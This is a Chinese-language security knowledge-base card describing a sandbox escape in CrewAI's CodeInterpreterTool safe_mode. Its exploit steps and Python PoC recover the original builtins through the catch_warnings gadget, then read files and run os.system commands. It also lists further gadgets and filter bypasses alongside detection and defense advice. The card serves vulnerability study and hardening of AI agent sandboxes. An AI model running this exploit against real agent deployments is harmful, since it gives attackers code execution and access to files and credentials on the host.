---
id: ai-security-agent-security-crewai-sandboxpython-dunder-subclasses-builtins-escape
title: CrewAI SandboxPython 沙箱逃逸：().__class__.__bases__[0].__subclasses__() 找 catch_warnings 恢复原始 builtins
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: crewai-sandboxpython-dunder-subclasses-builtins-escape
tags:
- ai-security
- crewai
- sandbox-escape
- python
- builtins
- dunder
- rce
- code-interpreter
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: crewai-tools <= 1.0.0a2
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T09:47:53+08:00'
  notes: 已对照原文与8张图核对：SandboxPython BLOCKED_MODULES/UNSAFE_BUILTINS、import os 被 restricted_import 拦截、().__class__.__bases__[0].__subclasses__() 枚举、catch_warnings 位于索引146、__init__.__globals__['__builtins__'] 取回原始 open/__import__/eval、os.system(whoami) 成功输出，均与图01-08一致；affected_versions 按原文“crewai-tools <= 1.0.0a2、修复待发布”保留。未验证点：PoC 未在本机复跑；catch_warnings 索引随 Python 环境变化，原文也说明按名称遍历更稳。
url: /docs/ai-security/agent-security/ai-security-agent-security-crewai-sandboxpython-dunder-subclasses-builtins-escape/
draft: false
kb_aliases:
- CrewAI SandboxPython
- CodeInterpreterTool safe_mode
- catch_warnings gadget
- __subclasses__ 沙箱逃逸
- Python builtins 恢复
- CrewAI 沙箱绕过
---

## 一句话结论

CrewAI 的 `CodeInterpreterTool` 在 `safe_mode` 下用 `SandboxPython.exec(code, {"__builtins__": safe_builtins}, locals)` 执行代码；它只替换了 `__builtins__` 字典，却没有阻断 Python 对象的属性图。攻击者用 `().__class__.__bases__[0].__subclasses__()` 找到 `warnings.catch_warnings` 类，再经 `__init__.__globals__['__builtins__']` 取回**原始、未受限**的 `open`/`__import__`/`eval`，即可在 safe_mode 下任意读写文件、导入 `os` 并执行系统命令。

## 原理

- **沙箱实现**：`SandboxPython` 维护 `BLOCKED_MODULES`（os/sys/subprocess/shutil/importlib/inspect/tempfile/sysconfig/builtins）与 `UNSAFE_BUILTINS`（exec/eval/open/compile/input/globals/locals/vars/help/dir）；`exec` 时构造一个只含白名单函数的 `safe_builtins` 字典作为 `__builtins__`。
- **只删名字、不删对象**：`exec` 的 globals 中 `__builtins__` 被替换，但代码里创建的任意对象（如空元组 `()`）仍然保留完整的类型/属性链。`().__class__` 是 `tuple`，`().__class__.__bases__[0]` 是 `object`，`object.__subclasses__()` 返回解释器中所有已加载的子类。
- **gadget 选择**：`warnings.catch_warnings` 是常用 gadget，其 `__init__` 是 Python 函数，`__init__.__globals__` 指向 `warnings` 模块的全局命名空间；该字典里的 `__builtins__` 是**原始 builtins 模块/字典**，包含 `open`、`__import__`、`eval` 等被沙箱移除的名字。
- **恢复能力**：拿到原始 builtins 后：
  - `open_func = original_builtins['open']` → 任意文件读写；
  - `import_func = original_builtins['__import__']` → `import_func("os")` 绕过 BLOCKED_MODULES；
  - `original_builtins['eval']` → 任意表达式执行；
  - 再 `getattr(os, "system")("whoami")` → 命令执行。
- **为什么“白名单 builtins”不够**：Python 的对象模型把模块全局、函数闭包、类继承都暴露为属性；只要攻击者能访问任意一个类/函数对象，就可能沿 `__globals__`/`__subclasses__`/`__init__` 找回原始能力。真正的隔离需要进程/容器级边界，而不是同进程内的名字过滤。
- **版本差异**：`catch_warnings` 在 `object.__subclasses__()` 中的索引随 Python 版本/已加载模块变化（示例为 146），payload 通常遍历查找 `__name__` 含 `catch_warnings` 的类，而不是硬编码索引。

## 触发条件

- 使用 CrewAI `CodeInterpreterTool` 的 `safe_mode`（`SandboxPython`），版本 `crewai-tools <= 1.0.0a2`。
- 攻击者可控制交给沙箱执行的 Python 代码字符串（如 LLM 生成、用户输入、Agent 工具调用）。
- 目标 Python 解释器中已加载 `warnings` 模块（标准库默认加载），`catch_warnings` 可被 `object.__subclasses__()` 枚举到。
- 沙箱未额外使用 Docker/进程隔离/ seccomp 等真正的边界；同进程内可访问文件系统与网络。

## 利用步骤

1. **验证限制**：执行 `import os`，确认被沙箱拦截（说明进入 safe_mode）。
2. **枚举子类**：`subclasses = ().__class__.__bases__[0].__subclasses__()`，打印/遍历找到 `catch_warnings`。
3. **恢复 builtins**：`original_builtins = warnings_class.__init__.__globals__['__builtins__']`。
4. **任意文件读**：`open_func = original_builtins['open']`，读取 `/tmp/test_secret.txt` 等目标文件。
5. **导入危险模块**：`import_func = original_builtins['__import__']`，`os_module = import_func("os")`。
6. **命令执行**：`getattr(os_module, "system")("whoami > /tmp/test.txt")`，读取输出确认 RCE。
7. **横向**：读写配置/凭据、反弹 shell、加载恶意模块；若沙箱进程有网络/文件权限，影响宿主。

## PoC

```python
import textwrap
from crewai_tools.tools.code_interpreter_tool.code_interpreter_tool import SandboxPython

code = textwrap.dedent("""
    subclasses = ().__class__.__bases__[0].__subclasses__()

    warnings_class = None
    for cls in subclasses:
        if 'catch_warnings' in cls.__name__:
            warnings_class = cls
            break

    if warnings_class:
        original_builtins = warnings_class.__init__.__globals__['__builtins__']
        import_func = original_builtins['__import__']
        os_module = import_func("os")
        getattr(os_module, "system")("whoami > /tmp/test.txt")
        result = "RCE_SUCCESS"
    else:
        result = "GADGET_NOT_FOUND"
""")

exec_locals = {}
SandboxPython.exec(code, exec_locals)
print(exec_locals.get("result"))
```

```python
# 任意文件读（同一 gadget）
code_read = """
subclasses = ().__class__.__bases__[0].__subclasses__()
warnings_class = next(c for c in subclasses if 'catch_warnings' in c.__name__)
builtins = warnings_class.__init__.__globals__['__builtins__']
open_func = builtins['open']
with open_func('/tmp/test_secret.txt', 'r') as f:
    result = f.read()
"""
```

原文在 `crewai-tools <= 1.0.0a2` 上验证了 `import os` 被拦截、子类枚举、原始 builtins 恢复、任意文件读与 `os.system("whoami")`；本卡不执行 PoC。

## 变体与关联

- **其它 gadget**：`warnings.catch_warnings` 之外，`os._wrap_close`、`subprocess.Popen`、`_sitebuiltins._Helper`、`codecs` 等也可提供 `__init__.__globals__`；不同 Python 版本/加载模块会影响可用 gadget。
- **其它绕过**：`__getattribute__`、`type.__subclasses__`、`__mro__`、`__closure__`、`__reduce__`、`globals()`；若沙箱也过滤属性名，可用 `getattr`/字符串拼接/编码绕过。
- **AST 黑名单**：文章给出的修复示例用 AST 拦截 `__class__`/`__globals__`/`__subclasses__` 等属性与 import；但 AST 黑名单仍可能被动态属性/编码/第三方库绕过，只能作为纵深。
- **关联**：[[ai-security-agent-security-crewai-filewriter-picklehandler-chain-rce]]（另一条 CrewAI 链）、[[binary-pwn-sandbox-escape-sandboxjs-object-values-function-array-fromentries]]（JS 沙箱逃逸）、[[binary-pwn-sandbox-escape-lua51-bytecode-forloop-tvalue-fake-closure]]（Lua 沙箱逃逸）。
- **边界**：同进程 Python 沙箱几乎无法做到安全；若 `safe_mode` 实际运行在 Docker/独立容器且无文件/网络权限，逃逸仅限容器内；若版本已修复（AST/属性过滤或强制 Docker），需重新评估。

## 检测与防御

- **隔离优先**：不要在同进程执行不可信 Python；使用 Docker/gVisor/Firecracker 等容器，配合 seccomp、只读文件系统、无网络、非 root 用户；`safe_mode` 应强制要求容器可用，否则拒绝执行。
- **AST/属性校验**：若保留进程内沙箱，至少用 AST 拦截 `__class__`、`__bases__`、`__subclasses__`、`__globals__`、`__code__`、`__closure__`、`__builtins__`、`__import__`、`__getattribute__` 等，并禁止 import；但这只是纵深，不能替代容器。
- **最小权限**：CodeInterpreter 进程以低权限运行，限制可读文件/环境变量/网络；敏感凭据不放在同进程环境。
- **检测**：沙箱代码中出现 `__subclasses__`/`__globals__`/`catch_warnings`/`os.system`/`subprocess` 等模式；CodeInterpreter 进程派生 shell、访问 `/tmp`/`/proc`/网络；异常文件读写与命令执行。
- **响应**：升级 `crewai-tools` 到修复版本、隔离/重建受影响容器、轮换环境中的凭据、审计 Agent 工具调用日志。
